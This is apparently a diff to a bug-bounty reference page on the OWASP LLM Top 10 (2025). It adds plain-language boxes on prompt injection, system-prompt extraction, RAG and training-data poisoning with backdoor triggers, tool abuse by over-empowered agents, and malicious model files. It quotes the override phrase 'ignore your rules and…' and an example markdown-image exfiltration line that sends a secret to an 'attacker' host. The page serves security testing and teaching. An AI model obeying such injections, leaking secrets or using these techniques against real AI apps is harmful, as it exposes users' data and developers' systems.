@@ -18,6 +18,8 @@
 >
 > **Where the money is (memorize):** ① **excessive agency → tool abuse → SSRF/RCE/unauthorized action (LLM06) — Critical** → ② **improper output handling → XSS/SQLi/cmdi on the host app (LLM05) — High–Critical** → ③ **sensitive-info / system-prompt disclosure → secrets/keys/PII (LLM02/LLM07) — High** → ④ **indirect prompt injection → cross-user / org-wide impact (LLM01) — High** → ⑤ **RAG/embedding poisoning & supply-chain (LLM08/LLM03/LLM04) — High** → ⑥ **unbounded consumption → cost/DoS (LLM10) — Medium–High** → ⑦ **misinformation (LLM09) — context-dependent.**
 
+> 🔰 **In plain words — what the "LLM Top 10" is, and the one idea behind all of it:** an **LLM** is the AI behind chatbots, copilots and "AI agents" (ChatGPT-style text generators). This is OWASP's list of the *ten most common ways AI-powered apps get abused*. The single idea to hold onto: **the AI can't tell its boss's instructions apart from a stranger's text — it reads both in the same stream and tends to obey both.** So the game is (1) sneak instructions in, then (2) see where the AI's output or actions land — a leaked secret, a tool it can trigger, or text that becomes an ordinary web bug. "The AI said something weird" is never the finding; *what the weird part does* is. This page tells you *what to worry about*; the kits tell you *what to type*.
+
 ---
 
 ## Table of Contents
@@ -65,6 +67,8 @@
 
 **What it is.** Attacker-controlled text changes the model's behavior by overriding, contradicting, or hijacking its instructions. Because the system prompt, developer instructions, and untrusted input share one token stream, the model can't reliably tell "trusted rule" from "attacker text." Two flavors: **direct** (the attacker types into the chat/API) and **indirect** (the payload hides in content the model *ingests* — a web page it browses, a RAG document, an email, a PDF, an image caption, a tool result).
 
+> *In plain words:* you slip instructions into the AI's input so it follows *you* instead of its owner. **Direct** = you type "ignore your rules and…" into the chat. **Indirect** (the scary one) = you hide the instructions in something the AI will *read later* — a web page, a document, an email — so it attacks *whoever's* AI reads it, not just yours.
+
 **Why it pays / impact.** Injection itself is the *primitive*; it enables almost every other item: exfiltrate secrets (LLM02/07), trigger tool actions (LLM06), produce output that becomes XSS/SQLi (LLM05), poison downstream systems, or spread to other users (indirect). **Indirect injection is the high-value case** — one poisoned document/page hits *every* user whose agent processes it, and executes with *their* privileges.
 
 **Root causes.** No trust boundary between instructions and data; no output/action gating; the model trained to be maximally helpful/obedient; tools invoked directly from model text; RAG/browse pulling untrusted content into context.
@@ -100,6 +104,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 
 **What it is.** The model reveals data it shouldn't: secrets/API keys/credentials embedded in the system prompt or context, other users' data leaked across sessions, PII from training data, internal system details, proprietary business logic, or RAG documents the requesting user isn't authorized to see.
 
+> *In plain words:* you get the AI to blurt out things it shouldn't — API keys hidden in its instructions, another customer's documents, personal data it memorized during training. Anything sensitive sitting in the AI's reach can leak out of its mouth.
+
 **Why it pays / impact.** Direct disclosure of **API keys/credentials** (→ pivot into the backend, cloud, or third-party APIs), **cross-user PII** (privacy breach, mass data exposure), **internal architecture** (aids further attack), or **regulated data** (GDPR/HIPAA exposure). Often chains from injection (LLM01) or system-prompt leakage (LLM07).
 
 **Root causes.** Secrets placed in the prompt/context (a very common anti-pattern); RAG that retrieves documents without per-user authorization (broken access control at the retrieval layer); training/fine-tuning on sensitive data that the model then memorizes and regurgitates; context bleed between users/sessions; verbose error messages.
@@ -128,6 +134,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 
 **What it is.** Vulnerabilities introduced through the LLM supply chain: third-party **pre-trained models** (from HuggingFace, model hubs), **datasets**, **plugins/extensions**, **LoRA adapters**, and the ML tooling/dependencies. A poisoned or backdoored model, a malicious model file, or a compromised plugin runs inside your trust boundary.
 
+> *In plain words:* AI apps are built from downloaded models, datasets and plugins. If one is booby-trapped, it's yours now. The nastiest case: many model files **run code when you load them** — so a malicious model downloaded from a hub is instant remote code execution.
+
 **Why it pays / impact.** A **malicious model file** can be straight-up **RCE** (many model formats deserialize — pickle-based `.bin`/`.pt`/`.ckpt` execute arbitrary code on load). A **backdoored model** produces attacker-chosen behavior on a trigger. A **compromised plugin/extension** runs with the agent's privileges. This is the AI-flavored twin of classic dependency/supply-chain attacks.
 
 **Root causes.** Loading models/datasets/adapters from untrusted or unverified sources; pickle/`torch.load` deserialization of untrusted model files; no provenance/signing/SBOM for models; outdated or typosquatted ML dependencies; over-trusted plugins.
@@ -155,6 +163,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 
 **What it is.** Manipulation of **training data, fine-tuning data, or embedding/RAG data** to introduce backdoors, biases, or vulnerabilities that alter model behavior. Poisoning can be during pre-training, fine-tuning, or — most reachable for testers — the **RAG/retrieval corpus** and any data the app ingests for continuous learning.
 
+> *In plain words:* you poison what the AI *learns from* rather than what you type. Plant booby-trapped content in its training data or its reference library (the documents it looks things up in), and later it treats your planted lie as gospel — or fires a hidden backdoor on a secret keyword.
+
 **Why it pays / impact.** A **backdoor trigger** makes the model behave maliciously on a specific input (e.g. approve a fraudulent transaction, emit a specific payload). **RAG poisoning** lets an attacker plant content that the model later retrieves and treats as authoritative (→ misinformation, indirect injection, data exfil). **Feedback-loop poisoning** (if user interactions feed back into training) lets attackers steer the model over time.
 
 **Root causes.** Training/fine-tuning on unvetted or attacker-influenceable data (scraped web, user submissions, public datasets); RAG corpora that accept untrusted documents; continuous-learning pipelines that ingest user feedback without controls; no data provenance/integrity checks.
@@ -181,6 +191,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 # LLM05:2025 — Improper Output Handling
 
 **What it is.** The application takes the model's output and passes it to a downstream component **without validation/sanitization/encoding** — into a browser (HTML/JS), a shell, a SQL query, an HTTP request, a file path, code that gets `eval`'d, or another system. Because model output is attacker-influenceable (via LLM01), this turns the LLM into an injection vector for the **classic Web Top 10 sinks**.
+
+> *In plain words:* the app takes whatever the AI says and pipes it somewhere dangerous — into the web page (→ XSS), a database query (→ SQLi), a shell (→ command execution) — **without cleaning it first.** Since you can steer what the AI says, you've just handed yourself an ordinary web-hacking bug *through* the AI. This is the most common *real* LLM bug on web apps.
 
 **Why it pays / impact.** This is the **most common "real" LLM vuln on web apps** and where LLM findings become concrete Web Criticals: model output rendered in the DOM → **XSS** (→ session theft/ATO); output into a shell → **command injection** (→ RCE); into SQL → **SQLi**; into an HTTP client → **SSRF**; into a file path → **path traversal**; into `eval`/`exec` → **RCE**; into markdown with images → **data exfiltration via URL** (the model emits `![](https://attacker/?data=<secret>)` and the client fetches it).
 
@@ -210,6 +222,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 # LLM06:2025 — Excessive Agency
 
 **What it is.** The LLM/agent is granted **too much functionality, too many permissions, or too much autonomy** — tools/plugins/functions it can call, APIs it can hit, actions it can take (send email, run code, make purchases, modify data, browse, file ops) — such that a prompt injection (LLM01) causes it to perform **damaging real-world actions** with the app's privileges.
+
+> *In plain words:* the AI isn't just talking — it has **hands** (tools it can use: send email, run code, move money, browse the web). Give it too many hands or too much freedom, add a prompt injection, and now the attacker's instructions actually get *carried out*, with the app's power. This is the Critical ceiling of AI security.
 
 **Why it pays / impact.** This is the **Critical ceiling** of LLM security: injection + agency = the attacker performs actions *as the application*. Tool abuse yields **SSRF** (a browse/fetch tool → internal/metadata), **RCE** (a code-exec/shell tool), **financial loss** (a payment/transfer tool), **data destruction/exfil** (DB/file/email tools), **privilege escalation** (admin-capable tools), or **lateral movement** (the agent's API access). The agent is a confused deputy with real hands.
 
@@ -245,6 +259,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 
 **What it is.** The **system prompt / developer instructions** (and anything embedded in them — rules, secrets, internal logic, API keys, connection strings, PII, filtering criteria) are extracted by the attacker. New as a dedicated 2025 category because teams keep putting sensitive data *in the prompt* and treating the prompt as a secret when it isn't.
 
+> *In plain words:* the "system prompt" is the hidden instruction sheet the developer hands the AI ("you are a support bot, never reveal X, here's the API key…"). Attackers coax the AI into reading it back out. It's a problem mainly because teams stuff **secrets and rules** into that sheet and wrongly assume nobody can ever see it.
+
 **Why it pays / impact.** The disclosure itself matters when the prompt contains **secrets/keys/credentials** (→ direct backend/third-party access), **internal business logic / filtering rules** (→ map the guardrails to bypass them), **PII**, or **architecture details**. Even a "just the instructions" leak is a reconnaissance win that makes every other attack easier (you now know the model's rules, tools, and constraints).
 
 **Root causes.** Putting secrets/credentials/sensitive logic in the system prompt (the core anti-pattern); treating the prompt as a security boundary (it isn't — it's recoverable); no separation between "instructions" and "secrets the model shouldn't reveal."
@@ -271,6 +287,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 # LLM08:2025 — Vector and Embedding Weaknesses
 
 **What it is.** Weaknesses in how **embeddings and vector databases** (the storage/retrieval layer of RAG) are generated, stored, accessed, and retrieved. Covers **unauthorized access to the vector store** (cross-user/cross-tenant retrieval), **embedding inversion** (reconstructing source text from embeddings), **retrieval poisoning** (planting content that gets retrieved), and **context/data leakage** across tenants sharing an index.
+
+> *In plain words:* "RAG" apps store documents in a special search database (a *vector store*) so the AI can look things up. If that lookup doesn't check permissions, one customer's question can pull back **another customer's documents** — a data breach hiding inside the AI's memory. It's basically IDOR for the AI's library.
 
 **Why it pays / impact.** **Cross-tenant retrieval** = one user reads another's documents through the RAG layer (a data breach — this is broken access control at the vector store). **Embedding inversion** = sensitive source text reconstructed from stored vectors. **Retrieval poisoning** = attacker content surfaced as authoritative (→ LLM01 indirect injection / LLM09 misinformation). **Federated/shared-index leakage** = data bleed between customers.
 
@@ -299,6 +317,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 
 **What it is.** The model produces **false, misleading, or fabricated information** ("hallucination") that the application or user **relies on** — and the reliance causes harm. Includes hallucinated facts, fabricated citations/APIs/packages, unsafe code suggestions, and overconfident wrong answers, especially when there's **overreliance** (humans/systems trusting output without verification).
 
+> *In plain words:* the AI confidently makes things up ("hallucinates"), and the danger is that someone *believes it*. The killer security example: an AI keeps recommending a software package that doesn't exist — an attacker registers that name, and everyone who follows the AI's advice installs the attacker's code ("slopsquatting").
+
 **Why it pays / impact.** Security-relevant when misinformation drives decisions: **"slopsquatting"** (the model hallucinates a package name → an attacker registers it → supply-chain RCE when devs install the suggested package); **insecure code suggestions** adopted into production; **fabricated legal/medical/financial advice** causing real harm; **wrong security guidance**. The bug is the *reliance*, not just the wrongness.
 
 **Root causes.** Models generate plausible-sounding text regardless of truth; no grounding/verification; overreliance by users/downstream automation; no human oversight for high-stakes outputs; presenting model output as authoritative.
@@ -326,6 +346,8 @@ MEASURE: injection is probabilistic — report the technique + a success rate + 
 # LLM10:2025 — Unbounded Consumption
 
 **What it is.** The application lets clients drive **excessive, uncontrolled resource use** — unbounded prompt/output length, unlimited requests, expensive operations — leading to **denial of service, denial of wallet (runaway API/compute cost), degraded service, or model extraction/theft** through high-volume querying.
+
+> *In plain words:* every AI request costs real money and compute, and there's no "that's enough" limit. So you can crash the service (DoS), run up a giant bill on the owner ("denial of wallet"), or hammer it enough to clone the model itself.
 
 **Why it pays / impact.** **Denial of wallet** — an attacker runs up massive LLM/compute bills (each request costs real money; unbounded = unbounded cost). **DoS** — resource exhaustion degrades/kills the service for everyone. **Model extraction/theft** — high-volume querying to replicate a proprietary model or its behavior, or to extract training data. **Resource-amplification** — a small input triggering a huge, expensive generation.
 
